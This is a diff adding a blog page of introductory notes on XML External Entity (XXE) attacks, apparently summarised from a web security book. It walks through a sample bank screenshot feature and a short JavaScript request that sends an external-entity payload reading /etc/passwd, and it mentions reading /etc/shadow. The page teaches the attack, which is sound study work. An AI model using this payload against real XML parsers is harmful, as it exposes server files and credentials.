@@ -1,0 +1,460 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XXE-notes-intro-level - caketi</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="红凯,
+
+
+
+
+a classification of attack that is often very simple to execute, but with devastating results.,"> 
+    <meta name="author" content="caketi"> 
+    <link rel="alternative" href="atom.xml" title="caketi" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">caketi</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://example.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">XXE-notes-intro-level</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                September 19, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/09/19/XXE-notes-intro-level/" title="XXE-notes-intro-level" class="">XXE-notes-intro-level</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    16k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    14 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <a id="more"></a>
+
+
+
+<ul>
+<li><strong><em>a classification of attack that is often very simple to execute, but with devastating results.Relies on improperly configured XML parser within an application’s code</em></strong></li>
+<li>an API endpoint that accepts an XML payload</li>
+<li><strong><em>XML-like formats include SVG, HTML/DOM, PDF(XPDF), and RTF</em></strong></li>
+<li>magic behind — XML specification includes a special annotation for importing external files. This special directive, called an external entity, is interpreted on the machine on which the XML file is evaluated. <blockquote>
+<p>This means that a spcially crafted XML payload sent to a server’s XML pareser could result in compromsing files in that servers’s file structure.</p>
+</blockquote>
+</li>
+<li>used to compromise files from other users</li>
+<li>access files like /etc/shadow – store important credentials required for a Univ-based server to function properly<h3 id="Direct-XXE"><a href="#Direct-XXE" class="headerlink" title="Direct XXE"></a>Direct XXE</h3>In direct XXE, an XML object is sent to the server with an external entity flag. It is<br>then parsed, and a result is returned that includes the external entity <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"> A simple button. Calls the <span class="function"><span class="keyword">function</span> `<span class="title">screenshot</span>(<span class="params"></span>)` <span class="title">when</span> <span class="title">clicked</span>.</span></span><br><span class="line"><span class="function"> --&gt;</span></span><br><span class="line"><span class="function">&lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">id</span>=&quot;<span class="title">screenshot</span>-<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">onclick</span>=&quot;<span class="title">screenshot</span>(<span class="params"></span>)&quot;&gt;</span></span><br><span class="line"><span class="function"> <span class="title">Send</span> <span class="title">Screenshot</span> <span class="title">to</span> <span class="title">Support</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="function">/*</span></span><br><span class="line"><span class="function"> * <span class="title">Collect</span> <span class="title">HTML</span> <span class="title">DOM</span> <span class="title">from</span> <span class="title">the</span> `<span class="title">content</span>` <span class="title">element</span> <span class="title">and</span> <span class="title">invoke</span> <span class="title">an</span> <span class="title">XML</span></span></span><br><span class="line"><span class="function"> * <span class="title">parser</span> <span class="title">to</span> <span class="title">convert</span> <span class="title">the</span> <span class="title">DOM</span> <span class="title">text</span> <span class="title">to</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">XML</span> <span class="title">over</span> <span class="title">HTTP</span> <span class="title">to</span> <span class="title">a</span> <span class="title">function</span> <span class="title">that</span> <span class="title">will</span> <span class="title">generate</span> <span class="title">a</span> <span class="title">screenshot</span></span></span><br><span class="line"><span class="function"> * <span class="title">from</span> <span class="title">the</span> <span class="title">provided</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">screenshot</span> <span class="title">to</span> <span class="title">support</span> <span class="title">staff</span> <span class="title">for</span> <span class="title">further</span> <span class="title">analysis</span>.</span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="title">screenshot</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to convert the `content` element to XML.</span></span><br><span class="line"><span class="comment"> * Catch if this process fails—generally this should succeed</span></span><br><span class="line"><span class="comment"> * because HTML is a subset of XML.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;content&#x27;</span>).innerHTML;</span><br><span class="line"> <span class="keyword">const</span> serializer = <span class="keyword">new</span> XMLSerializer();</span><br><span class="line"> <span class="keyword">const</span> dom = serializer.serializeToString(div);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Once the DOM has been converted to XML, generate a request to</span></span><br><span class="line"><span class="comment"> * an endpoint that will convert the XML to an image. Hence</span></span><br><span class="line"><span class="comment">142 | Chapter 12: XML External Entity (XXE)</span></span><br><span class="line"><span class="comment"> * resulting in a screenshot.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"> <span class="keyword">const</span> url = <span class="string">&#x27;https://util.mega-bank.com/screenshot&#x27;</span>;</span><br><span class="line"> <span class="keyword">const</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line"> data.append(<span class="string">&#x27;dom&#x27;</span>, dom);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the conversion of XML -&gt; image is successful,</span></span><br><span class="line"><span class="comment"> * send the screenshot to support for analysis.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Else alert the user the process failed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> sendScreenshotToSupport(xhr.responseText, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) &#123; alert(<span class="string">&#x27;could not send screenshot.&#x27;</span>) &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123; alert(<span class="string">&#x27;screenshot sent to support!&#x27;</span>); &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> xhr.send(data);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warn the user if their browser is not compatible with this feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> alert(Your browser does not support <span class="built_in">this</span> functionality. Consider upgrading.</span><br><span class="line"> );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<ol>
+<li>The browser converts the current user’s view (via the DOM) to XML.</li>
+<li>The browser sends this XML to a service which converts it to a JPG.</li>
+<li>The browser sends that JPG to a member of MegaBank support via another API.</li>
+</ol>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmltojpg <span class="keyword">from</span> <span class="string">&#x27;./xmltojpg&#x27;</span></span><br><span class="line"><span class="comment">/*Convert an XML to a JPG image.</span></span><br><span class="line"><span class="comment"> *Return the image data to the requester</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">app.post(<span class="string">&#x27;/screenshot&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.body.dom) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">    xmltojpg.convert(req.body.dom)</span><br><span class="line">    .then(<span class="function">(<span class="params">err, jpg</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;<span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">        <span class="keyword">return</span> res.send(jpg)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>To convert the XML file to a JPG file, it must go through an XML parser. To be a valid<br>XML parser, it must follow the XML spec.</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utilAPI <span class="keyword">from</span> <span class="string">&#x27;./utilAPI&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a new XML HTTP request targeting the XML -&gt; JPG utility API.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, utilAPI.url + <span class="string">&#x27;/screenshot&#x27;</span>)</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Provide a manually crafted XML string hat makes use of the external entity functionality in many XML parsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> rawXMLString = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;xxe;&lt;/xxe&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === XMLHttpRequest.DONE &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="comment">// chekc response data here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// send the request to the XML -&gt; JPG utility API endpoint</span></span><br><span class="line">xhr.send(rawXMLString)</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>caketi</p>
+                    <span>Think like an artist, develop like an artisan</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">12 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">0 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Direct-XXE"><span class="toc-number">1.</span> <span class="toc-text">Direct XXE</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            caketi
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.4" target="_blank" rel="noopener">v1.4.4</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+ 
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+  
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+ 
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+   
+<script src="/js/busuanzi.min.js"></script>
+
+<script>
+  $(document).ready(function () {
+    if ($('span[id^="busuanzi_"]').length) {
+      initialBusuanzi();
+    }
+  });
+</script>
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+ 
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() {
+    dataLayer.push(arguments);
+  }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-149874671-1');
+</script>
+ 
+
+<script>
+  function initialTyped() {
+    var typedTextEl = $('.typed-text');
+    if (typedTextEl && typedTextEl.length > 0) {
+      var typed = new Typed('.typed-text', {
+        strings: ['Think like an artist, develop like an artisan', '艺术家思维去思考问题，工匠创造精神去开发'],
+        typeSpeed: 90,
+        loop: true,
+        loopCount: Infinity,
+        backSpeed: 20,
+      });
+    }
+  }
+
+  if ($('.article-header') && $('.article-header').length) {
+    $(document).ready(function () {
+      initialTyped();
+    });
+  }
+</script>
+
+
+
+
+</html>
